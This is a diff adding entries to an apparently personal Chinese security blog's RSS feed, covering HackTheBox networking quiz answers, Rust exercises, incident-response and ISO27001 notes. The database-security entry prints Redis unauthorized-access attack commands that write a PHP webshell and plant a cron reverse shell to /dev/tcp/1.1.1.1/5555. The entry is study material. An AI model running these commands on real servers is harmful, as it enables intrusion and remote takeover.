@@ -1,2 +1,500 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>ClaudeRead</title><link>https://ClaudeRead.github.io</link><description>言而欲止，止又欲言，胡言乱语，语无伦次，信口雌黄，逐渐癫狂~~~</description><copyright>ClaudeRead</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/252286375?v=4&amp;size=64</url><title>avatar</title><link>https://ClaudeRead.github.io</link></image><lastBuildDate>Mon, 27 Apr 2026 17:18:14 +0000</lastBuildDate><managingEditor>ClaudeRead</managingEditor><ttl>60</ttl><webMaster>ClaudeRead</webMaster></channel></rss>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>ClaudeRead</title><link>https://ClaudeRead.github.io</link><description>言而欲止，止又欲言，胡言乱语，语无伦次，信口雌黄，逐渐癫狂~~~</description><copyright>ClaudeRead</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/252286375?v=4&amp;size=64</url><title>avatar</title><link>https://ClaudeRead.github.io</link></image><lastBuildDate>Tue, 28 Apr 2026 17:44:34 +0000</lastBuildDate><managingEditor>ClaudeRead</managingEditor><ttl>60</ttl><webMaster>ClaudeRead</webMaster><item><title>HackTheBox</title><link>https://ClaudeRead.github.io/post/HackTheBox.html</link><description>## Network Communication
+- What protocol maps IP addresses to MAC addresses?(哪种协议将 IP 地址映射到 MAC 地址？)
+ &gt; ARP
+
+- Which IP version uses 128-bit addressing?(哪种 IP 版本使用 128 位寻址？)
+ &gt; IPV6
+
+- At which layer of the OSI model do ports operate? (Format: two words)(端口号在 OSI 模型的哪一层运行？（格式：两个词）)
+ &gt; Transport Layer
+
+- What is the designated port number for HTTP?(HTTP 的指定端口号是多少？)
+ &gt; 80
+
+- What is the first step in the process of a web browsing session? (Format: two words)(浏览器会话的第一步是什么？（格式：两个词）)
+ &gt; DNS Lookup
+
+## Dynamic Host Configuration Protocol
+
+- What protocol automates IP address configuration for devices on a network?(哪种协议自动配置网络上的设备 IP 地址？)
+ &gt; DHCP
+
+- What acronym describes the sequence of messages exchanged during the DHCP process?（哪个缩写词描述了 DHCP 过程中交换的消息序列？）
+ &gt; DORA
+
+- What type of message does a client send to accept an IP address from a DHCP server?(客户端发送哪种类型的信息以接受来自 DHCP 服务器的 IP 地址？)
+ &gt; REQUEST
+
+## Network Address Translation (NAT)
+- What type of NAT allows multiple private IP addresses to share one public IP address using unique port numbers?
+ &gt; PAT
+
+- What RFC specifies private IP ranges?
+ &gt; RFC 1918
+
+- Which NAT type involves a one-to-one mapping of private IP addresses to public IP addresses?(哪种 NAT 类型涉及私有 IP 地址与公共 IP 地址的一对一映射？)
+ &gt; Static NAT
+
+- What type of NAT assigns a public IP from a pool as needed?(哪种 NAT 会根据需要从池中分配公共 IP 地址？)
+ &gt; Dynamic NAT
+
+- What device typically performs NAT in a home network?(哪种设备通常在家网络中执行 NAT？)
+ &gt; Router
+
+## Domain Name System (DNS)
+- What type of domain is `.com` considered as? (Format: Three words, example: One-Two Three)(`.com` 被视为哪种类型的域名？（格式：三个词，例如：一级 二级 三级）)
+ &gt; Top-Level Domain
+
+- In the domain `www.example.com`, what is `example` called?(在域名 `www.example.com` 中，`example` 被称为什么？
+)
+ &gt; Second-Level Domain
+
+- What is checked first in the DNS resolution process when you enter a domain name into a browser? (Format: Two words)(当你将域名输入浏览器时，DNS 解析过程中最先被检查的是什么？(格式：两个词))
+ &gt; DNS cache
+
+- What type of DNS server is typically provided by an Internet Service Provider?(互联网服务提供商通常提供哪种类型的 DNS 服务器？)
+ &gt; ecursive DNS server
+
+- Which server directs the recursive DNS server to the appropriate TLD name server?(哪个服务器指导递归 DNS 服务器到正确的顶级域名服务器？)
+ &gt; root server
+
+- What numerical label uniquely identifies a device on a network?(什么数字标签唯一标识网络上的一个设备？)
+ &gt; IP Address
+
+- In the URL 'accounts.google.com', what is `accounts` considered as?(在 URL 'accounts.google.com'中，`accounts`被视为什么？)
+ &gt; Subdomain
+。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/HackTheBox.html</guid><pubDate>Tue, 21 Apr 2026 01:32:26 +0000</pubDate></item><item><title>网络安全知识库小记</title><link>https://ClaudeRead.github.io/post/wang-luo-an-quan-zhi-shi-ku-xiao-ji.html</link><description>## 功能特性
+
+- **漏洞检索** - 支持 CVE 编号和关键词搜索，快速定位漏洞信息
+- **漏洞分析** - 结构化展示 CVSS 评分、攻击向量、影响范围
+- **POC 资源** - 自动聚合 GitHub、Exploit-DB 等平台的 POC 资源
+- **应急响应** - 文章体系，支持 Markdown 博客式展示
+- **数据同步** - 自动从 NVD API 增量同步漏洞数据
+- **全文搜索** - SQLite FTS5 全文搜索引擎
+- **离线运行** - SQLite 单文件数据库，无需外部依赖
+
+## 技术栈
+
+| 组件 | 技术选型 |
+|------|----------|
+| 后端框架 | Rust + Axum |
+| 数据库 | SQLite + FTS5 |
+| ORM | sqlx |
+| 模板引擎 | Askama |
+| Markdown | pulldown-cmark |
+| HTTP 客户端 | reqwest |
+| 异步运行时 | tokio |
+
+## 项目结构
+
+```
+Cybersecurity_Knowledge_Base/
+├── Cargo.toml                    # 项目配置和依赖
+├── .env                          # 环境变量配置
+├── migrations/
+│   └── 20240101000000_init.sql   # 数据库迁移脚本
+├── src/
+│   ├── main.rs                   # 主程序入口
+│   ├── model/
+│   │   └── mod.rs                # 数据模型定义
+│   ├── db/
+│   │   └── mod.rs                # 数据库操作层
+│   ├── parser/
+│   │   └── mod.rs                # NVD API 数据解析器
+│   ├── sync/
+│   │   └── mod.rs                # 数据同步模块
+│   ├── service/
+│   │   └── mod.rs                # 业务逻辑层
+│   └── api/
+│       ├── mod.rs                # API 模块声明
+│       ├── pages.rs              # 页面路由
+│       ├── vulnerabilities.rs    # 漏洞 API
+│       ├── poc.rs                # POC API
+│       ├── search.rs             # 搜索 API
+│       └── articles.rs           # 文章 API
+├── templates/                    # Askama HTML 模板
+│   ├── base.html                 # 基础模板
+│   ├── index.html                # 首页
+│   ├── vulnerabilities.html      # 漏洞列表页
+│   ├── vulnerability_detail.html # 漏洞详情页
+│   ├── articles.html             # 文章列表页
+│   └── article_detail.html       # 文章详情页
+├── static/
+│   ├── css/
+│   │   └── style.css             # 样式文件
+│   └── js/
+│       └── main.js               # 交互逻辑
+├── content/                      # 用户上传的 Markdown 文档
+└── knowledge_base.db             # SQLite 数据库文件
+```
+
+## 快速开始
+
+### 环境要求
+
+- Rust 1.70+
+- NVD API Key（可选，但强烈推荐）
+
+### 安装步骤
+
+1. **克隆项目**
+
+```bash
+git clone https://github.com/your-username/Cybersecurity_Knowledge_Base.git
+cd Cybersecurity_Knowledge_Base
+```
+
+2. **配置环境变量**
+
+编辑 `.env` 文件：
+
+```env
+DATABASE_URL=sqlite://knowledge_base.db?mode=rwc
+RUST_LOG=info
+NVD_API_KEY=your_api_key_here
+```
+
+&gt; **获取 NVD API Key**：访问 [NVD API 官网](https://nvd.nist.gov/developers/request-an-api-key) 申请免费 API Key
+
+3. **编译运行**
+
+```bash
+cargo run
+```
+
+4. **访问系统**
+
+浏览器打开 `http://localhost:3000`
+
+## 配置说明
+
+### 环境变量
+
+| 变量名 | 必填 | 默认值 | 说明 |
+|--------|------|--------|------|
+| `DATABASE_URL` | 否 | `sqlite://knowledge_base.db?mode=rwc` | SQLite 数据库连接字符串 |
+| `RUST_LOG` | 否 | `info` | 日志级别 (error/warn/info/debug/trace) |
+| `NVD_API_KEY` | 否 | 无 | NVD API 密钥（无 Key 限制请求频率） |
+
+### NVD API 速率限制
+
+- **无 API Key**：每 30 秒 5 个请求
+- **有 API Key**：每 30 秒 50 个请求
+
+建议申请 API Key 以获得更快的数据同步速度。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/wang-luo-an-quan-zhi-shi-ku-xiao-ji.html</guid><pubDate>Sun, 22 Mar 2026 02:22:22 +0000</pubDate></item><item><title>讲义生成系统小记</title><link>https://ClaudeRead.github.io/post/jiang-yi-sheng-cheng-xi-tong-xiao-ji.html</link><description>## ⚙️ 说明&#13;
+&#13;
+&amp;emsp;&amp;emsp;最近用AI大模型尝试开发了一个讲义生成系统，这个系统尝试解决如下这个情况：&#13;
+- 本地有一个知识库，如果现在去做一个培训，恰好培训的内容是你在知识库当中平时记录的内容，现在需要将知识库中记录的笔记转化成讲义。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/jiang-yi-sheng-cheng-xi-tong-xiao-ji.html</guid><pubDate>Fri, 20 Mar 2026 06:48:06 +0000</pubDate></item><item><title>SRC中逻辑漏洞总结</title><link>https://ClaudeRead.github.io/post/SRC-zhong-luo-ji-lou-dong-zong-jie.html</link><description>### 备注：以下内容有些源自网络。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/SRC-zhong-luo-ji-lou-dong-zong-jie.html</guid><pubDate>Fri, 20 Mar 2026 02:35:08 +0000</pubDate></item><item><title>Rust学习记录(一)</title><link>https://ClaudeRead.github.io/post/Rust-xue-xi-ji-lu-%28-yi-%29.html</link><description># Rust基础部分的语法问题记录
+
+### 1、`use rand::Rng`  
+- 使用`use` 对相关库进行引入  
+- `'::'`说明：模块::类型/函数/特质(A::B 就是“在 A 里面找 B”)  
+  
+### 2、关于`loop{}`是否可以理解为`while(true){}`  
+可以，`loop` 是Rust中的无限循环关键字，只要不遇到 break 或程序终止，就会一直执行循环体  
+  
+### 3、在代码中let mut guess中一定要将guess变量设为mut吗？  
+是的，因为`read_line(&amp;mut guess)`方法需要一个可变引用来修改字符串的内容，所以在创建`guess`时必须使用`mut关键字`将其声明为可变变量，如果`guess`是不可变的，就无法调用需要可变引用的方法。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Rust-xue-xi-ji-lu-%28-yi-%29.html</guid><pubDate>Fri, 20 Mar 2026 02:34:44 +0000</pubDate></item><item><title>ISO27001相关内容</title><link>https://ClaudeRead.github.io/post/ISO27001-xiang-guan-nei-rong.html</link><description>&amp;emsp;&amp;emsp;综述：目前 ISO/IEC 27001 的最新正式版本是 ISO/IEC 27001:2022（第三版），并在 2024 年发布了增补Amd 1:2024 Climate action changes，但标准主体仍是2022版。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/ISO27001-xiang-guan-nei-rong.html</guid><pubDate>Fri, 20 Mar 2026 02:34:18 +0000</pubDate></item><item><title>应急排查</title><link>https://ClaudeRead.github.io/post/ying-ji-pai-cha.html</link><description>#### 处置经过
+&amp;emsp;&amp;emsp;2024年某月某日上午09时接到科室相关人员反馈登录x.x.x.x查看日志时发现日志存在异常问题。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/ying-ji-pai-cha.html</guid><pubDate>Fri, 20 Mar 2026 02:33:56 +0000</pubDate></item><item><title>业务系统风险评估</title><link>https://ClaudeRead.github.io/post/ye-wu-xi-tong-feng-xian-ping-gu.html</link><description>&amp;emsp;&amp;emsp;综述：本篇内容为记录对本部指定业务开展安全风险评估的记录，本次风险评估以ISO27001安全体系为指导，GB/T 20984 2022为方法论，对涉及本部的业务资产开展风险评估，为后续持续安全运营与安全管理做铺垫。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/ye-wu-xi-tong-feng-xian-ping-gu.html</guid><pubDate>Fri, 20 Mar 2026 02:33:31 +0000</pubDate></item><item><title>逻辑漏洞</title><link>https://ClaudeRead.github.io/post/luo-ji-lou-dong.html</link><description>&amp;emsp;&amp;emsp;综述：逻辑漏洞逻辑漏洞是一种代码思路上面的漏洞。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/luo-ji-lou-dong.html</guid><pubDate>Fri, 20 Mar 2026 02:31:15 +0000</pubDate></item><item><title>跨站请求攻击-CSRF</title><link>https://ClaudeRead.github.io/post/kua-zhan-qing-qiu-gong-ji--CSRF.html</link><description>&amp;emsp;&amp;emsp;跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件、发消息、甚至财产操作：转账、购买商品等）。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/kua-zhan-qing-qiu-gong-ji--CSRF.html</guid><pubDate>Fri, 20 Mar 2026 02:30:43 +0000</pubDate></item><item><title>记录某日安全巡检中发现某业务发生安全问题</title><link>https://ClaudeRead.github.io/post/ji-lu-mou-ri-an-quan-xun-jian-zhong-fa-xian-mou-ye-wu-fa-sheng-an-quan-wen-ti.html</link><description>&amp;emsp;&amp;emsp;综述：某日进行安全巡检中通过安全设备发现内网x.x.x.x出现安全告警，通过数据包分析确确认攻击行为。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/ji-lu-mou-ri-an-quan-xun-jian-zhong-fa-xian-mou-ye-wu-fa-sheng-an-quan-wen-ti.html</guid><pubDate>Fri, 20 Mar 2026 02:30:13 +0000</pubDate></item><item><title>安全巡检中发现攻击事件排查</title><link>https://ClaudeRead.github.io/post/an-quan-xun-jian-zhong-fa-xian-gong-ji-shi-jian-pai-cha.html</link><description>#### 事件经过
+&amp;emsp;&amp;emsp;2025年6月7日上午09时安全设备巡检中发现x.x.x.x受到来自111.229.247.93攻击，攻击手段使用了Cobalt Strike远程控制工具，分析人员将此安全事件进行上报处理。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/an-quan-xun-jian-zhong-fa-xian-gong-ji-shi-jian-pai-cha.html</guid><pubDate>Fri, 20 Mar 2026 02:29:49 +0000</pubDate></item><item><title>数据库安全</title><link>https://ClaudeRead.github.io/post/shu-ju-ku-an-quan.html</link><description>#### 一、如何引发数据库服务的安全问题
+- 配置不当—未授权访问
+- 自身软件设计上存在缺陷—特定安全漏洞
+- 有些服务使用口令验证进行操作，由于用户疏忽没有及时更改相关口令或设置的口令过于简单—弱口令爆破
+
+#### 二、测试大致思路
+1. 判断服务是否开放
+&amp;emsp;- 端口扫描
+&amp;emsp;- 组合猜测
+&amp;emsp;- 信息来源
+2. 通过上一步进行端口信息判断服务类型
+&amp;emsp;- 数据库
+&amp;emsp;- 文件传输
+&amp;emsp;- 远程控制
+&amp;emsp;- 数据通讯
+3. 判断利用方式
+&amp;emsp;- 特性漏洞
+&amp;emsp;- 未授权访问
+&amp;emsp;- 弱口令爆破
+
+#### 三、常见数据库当中漏洞
+1. MySQL未授权访问CVE-2012-2122
+2. Hadoop未授权访问-内置配合命令执行RCE
+&amp;emsp;- Hadoop端口信息：50010
+3. Redis未授权访问-WEBShell&amp;任务&amp;密匙&amp;RCE等
+&amp;emsp;- 未授权访问的条件：
+&amp;emsp;&amp;emsp;- `bind 127.0.0.1`注释符开启则表示只能本地进行访问，如果被注释则可以通过外网访问
+&amp;emsp;&amp;emsp;- `protected-mode no` 安全模式选项为关闭
+&amp;emsp;&amp;emsp;- 没有设置密码`# requirepass foobared`
+&amp;emsp;- 写WebShell的条件：需要知道web路径以及web目录权限可读写,例如：
+```bash
+config set dir /tmp           # 设置WEB写入目录
+config set dbfilename 1.php   # 设置写入文件名
+set test'&lt;?php phpinfo();?&gt;'  # 设置写入文件内容
+bgsave						  # 保存执行
+save						  # 保存执行
+```
+
+&amp;emsp;&amp;emsp;&amp;emsp;- 写定时任务反弹shell
+&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;- 允许异地登录
+&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;- `protected-mode no` 安全模式选项为关闭
+```nix
+config set dir /var/spool/cron  # 记时目录路径
+set yy '\n\n\n*****bash -i&gt;&amp; /dev/tcp/1.1.1.1/5555 0&gt;&amp;1\n\n\n' # 写入任务代码
+config set dbfilename x	# 写入文件名
+save 	# 保存
+注意：centos会忽略乱码去执行正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/shu-ju-ku-an-quan.html</guid><pubDate>Fri, 20 Mar 2026 01:43:45 +0000</pubDate></item><item><title>Spring组件漏洞：CVE-2018-1273</title><link>https://ClaudeRead.github.io/post/Spring-zu-jian-lou-dong-%EF%BC%9ACVE-2018-1273.html</link><description>危害：
+
+- Spring Data Commons组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限
+- Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Spring-zu-jian-lou-dong-%EF%BC%9ACVE-2018-1273.html</guid><pubDate>Fri, 20 Mar 2026 01:41:03 +0000</pubDate></item><item><title>Rust学习记录(二)</title><link>https://ClaudeRead.github.io/post/Rust-xue-xi-ji-lu-%28-er-%29.html</link><description>Rust基础部分的问题记录
+
+#### 1、变量和可变性
+```rust
+fn main() {  
+    let x: u8 = 5;  
+    // println!('第一种写法：The value of x is: {}', x);  
+    println!('第二种写法：The value of x is: {x}');  
+    x = 6;  
+    println!('The value of x is: {x}');  
+}
+```
+上述代码会报错：
+```powershell
+error[E0384]: cannot assign twice to immutable variable `x`                                                                                
+ --&gt; src\main.rs:6:5
+  |
+2 |     let x: u8 = 5;
+  |         - first assignment to `x`
+...
+6 |     x = 6;
+  |     ^^^^^ cannot assign twice to immutable variable
+  |
+help: consider making this binding mutable
+  |
+2 |     let mut x: u8 = 5;
+  |         +++
+
+For more information about this error, try `rustc --explain E0384`.                                                                                                                                                            
+error: could not compile `variables` (bin 'variables') due to 1 previous error
+```
+报错原因：
+&amp;emsp;&amp;emsp;因为在Rust中，为了确保安全性，变量默认不可变，当变量不可变时，一旦值被绑定一个名称上，用户就不能改变这个值。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Rust-xue-xi-ji-lu-%28-er-%29.html</guid><pubDate>Fri, 20 Mar 2026 01:41:01 +0000</pubDate></item><item><title>Rust基础部分练习</title><link>https://ClaudeRead.github.io/post/Rust-ji-chu-bu-fen-lian-xi.html</link><description>实验内容：使用Rust语言，做一个学生管理系统的Demo
+
+实验功能：
+&amp;emsp;1. 设置欢迎界面
+&amp;emsp;2. 要求需要对用户输入进行检查
+&amp;emsp;3. 功能模块划分为：
+&amp;emsp;&amp;emsp;a. 第一选项为显示所有学生
+&amp;emsp;&amp;emsp;b. 第二选项为增加学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 内容：姓名、年龄、班级
+&amp;emsp;&amp;emsp;c. 第三选项为删除学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 先显示全部学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 通过指定序号进行删除
+&amp;emsp;&amp;emsp;d. 第四选项为查找指定学生
+&amp;emsp;&amp;emsp;&amp;emsp;- 根据姓名查找学生，显示匹配的学生信息
+&amp;emsp;&amp;emsp;e. 第五选项为退出系统
+
+备注：需要对代码进行添加注释
+
+#### 主界面
+```rust
+let mut students: Vec&lt;(String, u8, String)&gt; = Vec::new();  
+  
+// loop 是一个无限循环，会一直执行直到遇到 break 语句  
+// 这是程序的主循环，用于持续显示菜单和处理用户操作  
+loop {  
+    println!('***学 生 管 理 系 统***');  
+    println!('1.显示所有学生');  
+    println!('2.增加学生');  
+    println!('3.删除学生');  
+    println!('4.查找指定学生');  
+    println!('5.退出');  
+    println!('==========================');  
+    println!('请选择操作 (1-5): ');  
+  
+    // 创建一个空的字符串变量，用于存储用户的输入  
+    // String::new() 创建一个新的空字符串  
+    let mut choice = String::new();  
+      
+    // std::io::stdin() 获取标准输入（键盘输入）  
+    // .read_line(&amp;mut choice) 读取一行输入并存储到 choice 变量中  
+    // &amp;mut choice 表示传递 choice 的可变引用，允许函数修改它  
+    // .expect('输入参数有误，请重新输入') 如果读取失败，显示错误信息并终止程序  
+    std::io::stdin()  
+        .read_line(&amp;mut choice)  
+        .expect('输入参数有误，请重新输入');  
+  
+    // ==================== 输入验证部分 ====================    
+    // choice.trim() 去除字符串两端的空白字符（包括换行符）  
+    // .parse() 尝试将字符串解析为数字  
+    // match 是 Rust 的模式匹配，类似于其他语言的 switch-case    
+    // Ok(num) 表示解析成功，num 是解析出的数字  
+    // Err(_) 表示解析失败，_ 表示忽略错误的具体信息  
+    let choice: u32 = match choice.trim().parse() {  
+        Ok(num) =&gt; num,  // 解析成功，使用解析出的数字  
+        Err(_) =&gt; {  
+            println!('waring: 请输入数字！');  
+            continue;  // 跳过本次循环的剩余部分，直接开始下一次循环  
+        }  
+    };  
+  
+    // ==================== 根据用户选择执行操作 ====================    
+    if choice == 1 {  
+        // 调用显示所有学生的函数  
+        // &amp;mut students 传递 students 的可变引用  
+        // 虽然显示函数不需要修改数据，但为了与其他函数保持一致性  
+        show_all_students(&amp;mut students);  
+    } else if choice == 2 {  
+        // 调用添加学生的函数  
+        add_student(&amp;mut students);  
+    } else if choice == 3 {  
+        // 调用删除学生的函数  
+        delete_student(&amp;mut students);  
+    } else if choice == 4 {  
+        // 调用查找学生的函数  
+        find_student(&amp;mut students);  
+    } else if choice == 5 {  
+        // 用户选择退出  
+        println!('感谢使用学生管理系统，再见！');  
+        break;  // break 语句跳出循环，结束程序  
+    } else {  
+        // 用户输入了无效的选项  
+        println!('无效的选择，请重新输入！');  
+    }  
+    // 循环结束，继续下一次迭代，重新显示菜单  
+}
+```
+
+#### 添加学生功能
+```rust
+fn add_student(students: &amp;mut Vec&lt;(String, u8, String)&gt;) {  
+    // 打印功能标题，\n 表示换行  
+    println!('\n---添加学生---');  
+  
+    // ==================== 输入学生姓名 ====================    
+      
+    // 创建一个空字符串用于存储姓名输入  
+    let mut name = String::new();  
+      
+    // 读取用户输入的一行文本到 name 变量中  
+    std::io::stdin()  
+        .read_line(&amp;mut name)  
+        .expect('无法读取');  
+      
+    // trim() 去除字符串两端的空白字符（包括用户按回车产生的换行符）  
+    // to_string() 将字符串切片转换为 String 类型  
+    // 这样处理后，name 就是一个干净的字符串，没有多余的空白  
+    let name = name.trim().to_string();  
+  
+    // ==================== 输入学生年龄 ====================    
+      
+    // 创建一个空字符串用于存储年龄输入  
+    // 注意：用户输入的是文本，需要转换为数字  
+    let mut age_str = String::new();  
+      
+    // 读取用户输入  
+    std::io::stdin()  
+        .read_line(&amp;mut age_str)  
+        .expect('无法读取输入');  
+      
+    // 尝试将字符串转换为 u8 类型的数字（0-255）  
+    // match 进行模式匹配，判断转换是否成功  
+    let age: u8 = match age_str.trim().parse() {  
+        Ok(num) =&gt; num,  // 转换成功，使用转换后的数字  
+        Err(_) =&gt; {  
+            // 转换失败，说明用户输入的不是数字  
+            println!('年龄必须为数字！添加失败！！！');  
+            return;  // return 提前退出函数，不执行后面的代码  
+        }  
+    };  
+  
+    // ==================== 输入学生班级 ====================    
+    // 创建一个空字符串用于存储班级输入  
+    let mut class_name = String::new();  
+      
+    // 读取用户输入  
+    std::io::stdin()  
+        .read_line(&amp;mut class_name)  
+        .expect('无法读取');  
+      
+    // 去除空白字符并转换为 String 类型  
+    let class_name = class_name.trim().to_string();  
+  
+    // ==================== 将学生信息添加到列表 ====================    
+    // students.push() 向动态数组的末尾添加一个元素  
+    // (name, age, class_name) 创建一个元组，包含三个数据  
+    // 元组的顺序对应：(姓名: String, 年龄: u8, 班级: String)  
+    students.push((name, age, class_name));  
+      
+    // 函数结束，学生信息已成功添加到列表中  
+}
+
+```
+
+#### 删除学生
+```rust
+fn delete_student(students: &amp;mut Vec&lt;(String, u8, String)&gt;) {  
+    println!('\n--- 删除学生 ---');  
+  
+    // ==================== 检查列表是否为空 ====================    
+    
+    // students.is_empty() 检查动态数组是否为空  
+    if students.is_empty() {  
+        println!('暂无学生数据。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Rust-ji-chu-bu-fen-lian-xi.html</guid><pubDate>Fri, 20 Mar 2026 01:40:58 +0000</pubDate></item><item><title>RCE--远程代码-命令执行漏洞</title><link>https://ClaudeRead.github.io/post/RCE---yuan-cheng-dai-ma---ming-ling-zhi-xing-lou-dong.html</link><description>简介：Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/RCE---yuan-cheng-dai-ma---ming-ling-zhi-xing-lou-dong.html</guid><pubDate>Fri, 20 Mar 2026 01:40:56 +0000</pubDate></item><item><title>Linux应急响应时相关命令</title><link>https://ClaudeRead.github.io/post/Linux-ying-ji-xiang-ying-shi-xiang-guan-ming-ling.html</link><description>### 查看用户
+```Plain Text
+1. 查看用户信息文件
+cat /etc/passwd
+2. 查看影子文件
+cat /etc/shadow
+3. 查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户
+awk -F: '$3==0{print $1}' /etc/passwd
+cat /etc/passwd | grep x:0
+```
+### 查看当前登录用户，以及其登录ip。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/Linux-ying-ji-xiang-ying-shi-xiang-guan-ming-ling.html</guid><pubDate>Fri, 20 Mar 2026 01:40:54 +0000</pubDate></item><item><title>SSRF漏洞</title><link>https://ClaudeRead.github.io/post/SSRF-lou-dong.html</link><description>### SSRF
+
+&amp;emsp;&amp;emsp;Server-Slde Request Forgery：服务器端请求伪造。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/SSRF-lou-dong.html</guid><pubDate>Thu, 19 Mar 2026 15:14:19 +0000</pubDate></item><item><title>关于这段时间AI的使用思考</title><link>https://ClaudeRead.github.io/post/guan-yu-zhe-duan-shi-jian-AI-de-shi-yong-si-kao.html</link><description>&amp;emsp;&amp;emsp;从DeepSeek火爆的时候我开始正式接触AI，了解过一些底层原理，但是也仅限于知道是怎么回事，在往下就没有细究了，更多的是在探索怎么结合AI让我学习工作效率更高。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/guan-yu-zhe-duan-shi-jian-AI-de-shi-yong-si-kao.html</guid><pubDate>Mon, 09 Mar 2026 15:22:56 +0000</pubDate></item><item><title>生活随笔(四)</title><link>https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-si-%29.html</link><description>&amp;emsp;&amp;emsp;2026年新年快乐！！！！祝互联网的常驻民们平平安安！！！🙏🙏🙏
+&amp;emsp;&amp;emsp;该说不说，重庆渝东巫山、巫溪、奉节、万州这几个地方真的不错，尤其是巫山和奉节，奉节的脐橙真的巨甜😋😋😋疯狂安利一波~~~~，还有万州的格格，这格格类似与陕西的粉蒸肉(虽然我看B站上的评论区说这俩实际上不太一样，但是....真的看起来都差不多)😋😋😋万州的杂酱面也好吃，这地方好吃的不少，价格也比其他地方便宜好多。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-si-%29.html</guid><pubDate>Wed, 18 Feb 2026 04:12:00 +0000</pubDate></item><item><title>ISO27001-风险评估工作记录</title><link>https://ClaudeRead.github.io/post/ISO27001--feng-xian-ping-gu-gong-zuo-ji-lu.html</link><description>&amp;emsp;&amp;emsp;综述：在ISO 27001中，核心是风险评估，但是GB/T 20984-2022《信息安全技术 信息安全风险评估方法》也是风险评估。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/ISO27001--feng-xian-ping-gu-gong-zuo-ji-lu.html</guid><pubDate>Wed, 17 Dec 2025 01:21:22 +0000</pubDate></item><item><title>等保相关内容学习记录(一)</title><link>https://ClaudeRead.github.io/post/deng-bao-xiang-guan-nei-rong-xue-xi-ji-lu-%28-yi-%29.html</link><description>#### 一、什么是等保&#13;
+&amp;emsp;&amp;emsp;'等保2.0'，是指以 2019 年发布的新一代网络安全等级保护标准为标志的等级保护制度，以《中华人民共和国网络安全法》为上位法，第二十一条明确'国家实行网络安全等级保护制度'，使等保成为网络运营者的法律义务。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/deng-bao-xiang-guan-nei-rong-xue-xi-ji-lu-%28-yi-%29.html</guid><pubDate>Thu, 24 Jul 2025 09:21:22 +0000</pubDate></item><item><title>CVE-2019-12409</title><link>https://ClaudeRead.github.io/post/CVE-2019-12409.html</link><description>#### 背景、原理&#13;
+&#13;
+&amp;emsp;&amp;emsp;CVE-2019-12409 是 Apache Solr 中的远程代码执行漏洞，影响版本为 Apache Solr 5.0.0 至 8.2.0。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/CVE-2019-12409.html</guid><pubDate>Thu, 03 Apr 2025 07:23:09 +0000</pubDate></item><item><title>2024年总结</title><link>https://ClaudeRead.github.io/post/2024-nian-zong-jie.html</link><description>&amp;emsp;&amp;emsp;回顾整个2024年，有很多想说的东西，但是一时间真的不知道该从何说起，所以就想到哪说哪吧。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/2024-nian-zong-jie.html</guid><pubDate>Tue, 31 Dec 2024 04:12:00 +0000</pubDate></item><item><title>生活随笔(二)</title><link>https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-er-%29.html</link><description>之前一直看网上说XSS这机子怎么怎么🐮，说实话在目下这个主机版本里面XSS的性能真不怎么样，就同家的XSX的性能都比XSS强，所以XSS就不能单拉性能而论。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-er-%29.html</guid><pubDate>Fri, 31 May 2024 04:12:00 +0000</pubDate></item><item><title>2020年总结</title><link>https://ClaudeRead.github.io/post/2020-nian-zong-jie.html</link><description>&amp;emsp;&amp;emsp;这一年一半记忆在电脑上，一半的记忆在学校，拿了三个无关痛痒的红本本，也没有太多惊喜。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/2020-nian-zong-jie.html</guid><pubDate>Tue, 12 Jan 2021 03:21:23 